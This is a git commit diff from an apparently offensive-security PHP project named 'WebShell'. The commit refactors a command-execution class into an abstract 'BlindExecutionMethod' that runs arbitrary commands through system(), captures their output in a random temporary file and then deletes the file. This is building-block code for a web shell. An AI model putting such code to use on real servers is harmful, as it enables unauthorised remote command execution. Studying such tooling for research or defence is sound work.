089867287fe074442026111d07a3d4fa302db693
David Gilarraz Ortega <david.gilarranz016@comunidadunir.net>
2025-05-29 20:59:26 +0200

    SystemExecutionMethod -> refactored code to BlindExecutionMethod superclass

---
+++ src/BlindExecutionMethod.php
@@ -0,0 +1,23 @@
+<?php
+namespace WebShell;
+
+abstract class BlindExecutionMethod implements ExecutionMethod {
+    public function execute($cmd) {
+        // Create a temporary random file and redirect the command output to it
+        $fileName = bin2hex(random_bytes(32)) . '.txt';
+        $this->run_command($cmd . " > {$fileName} 2>&1");
+
+        // Read the contents of the file
+        $fd = fopen($fileName, 'r');
+        $output = fread($fd, filesize($fileName));
+
+        // Delete the temporary file
+        unlink($fileName);
+        
+        // Return the command output
+        return $output;
+    }
+
+    abstract protected function run_command($cmd);
+}
+?>
--- src/SystemExecutionMethod.php
+++ src/SystemExecutionMethod.php
@@ -1,21 +1,9 @@
 <?php
 namespace WebShell;
 
-class SystemExecutionMethod implements ExecutionMethod {
-    public function execute($cmd) {
-        // Create a temporary random file and redirect the command output to it
-        $fileName = bin2hex(random_bytes(32)) . '.txt';
-        system($cmd . " > {$fileName} 2>&1");
-
-        // Read the contents of the file
-        $fd = fopen($fileName, 'r');
-        $output = fread($fd, filesize($fileName));
-
-        // Delete the temporary file
-        unlink($fileName);
-        
-        // Return the command output
-        return $output;
+final class SystemExecutionMethod extends BlindExecutionMethod {
+    protected function run_command($cmd) {
+        system($cmd);
     }
 }
 ?>
